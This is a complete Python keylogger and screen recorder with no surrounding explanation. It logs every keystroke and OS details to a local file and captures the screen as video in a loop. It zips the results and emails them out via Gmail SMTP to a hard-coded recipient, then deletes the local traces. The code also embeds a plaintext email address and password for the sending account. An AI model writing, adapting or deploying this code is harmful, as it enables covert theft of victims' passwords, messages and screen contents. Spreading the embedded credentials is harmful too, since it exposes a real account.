import os
import platform as plat
from pynput import keyboard
import numpy as np
import cv2
import pyautogui 
import threading
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


def keyboard_monitoring():
    #collect events (pressed keys)
    with keyboard.Listener(on_press=savekey) as listener:
        listener.join()

def record():
    while True:
        screen_size = tuple(pyautogui.size())
        fourcc = cv2.VideoWriter_fourcc(*"XVID")
        fps = 12
        video_file = "C:/Docs/vid.avi"
        out = cv2.VideoWriter(video_file, fourcc, fps, screen_size)
        time2rec = 20 
        for i in range(int(time2rec * fps)):
            img = pyautogui.screenshot()
            # convert these pixels to a proper numpy array to work with OpenCV
            frame = np.array(img)
            # convert colors from BGR to RGB
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            # write the frame
            out.write(frame)
        cv2.destroyAllWindows()
        out.release()
        shutil.make_archive("C:/Docs/Docs_z", 'zip', "C:/Docs")
        keys_file = open("C:/Docs/keys.txt", "w").close()
        os.remove("C:/Docs/vid.avi")
        send_mail()
        os.remove("C:/Docs/Docs_z.zip")

def savekey(key):
    keys_file = open("C:/Docs/keys.txt", "a")
    keys_file.write(str(key)+"\n")
    keys_file.close()

def send_mail():
    msg = MIMEMultipart()
    msg['From'] = from_add
    msg['To'] = to_add
    msg['Subject'] = "New monitoring files to see"
    body = "check that"
    msg.attach(MIMEText(body, 'plain'))
    filename = "Docs_z.zip"
    attachment = open("C:/Docs/Docs_z.zip", "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p) 
    try: 
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        s.login(from_add, password)
        text = msg.as_string()
        s.sendmail(from_add, to_add, text)
        s.quit()
    except:
        print("lost")
    attachment.close()
from_add = "otmanmabrouk2020@gmail.com"
password = "otmanmabrouk-1999"
to_add = "otmanelmabrouk99@gmail.com"
        #1-Docs & info-gath
#check if Docs exist if it doesn't creates it
Docs_exist = os.path.isdir("C:/Docs")
if Docs_exist == False:
    os.mkdir("C:/Docs")

#clear the content of keys.txt or create it if it doesn't exist 
keys_file = open("C:/Docs/keys.txt", "w").close()

#gather infos about the machine and append them to keys.txt
os_info = "OS name: "+str(plat.system())+"   OS version: "+str(plat.release())+"  architecture: "+str(plat.architecture())
keys_file = open("C:/Docs/keys.txt", "a")
keys_file.write(os_info+"\n\n")
keys_file.close()

        #2-start monitoring
thread1 = threading.Thread(target=keyboard_monitoring)
thread2 = threading.Thread(target=record)
thread1.start()
thread2.start()
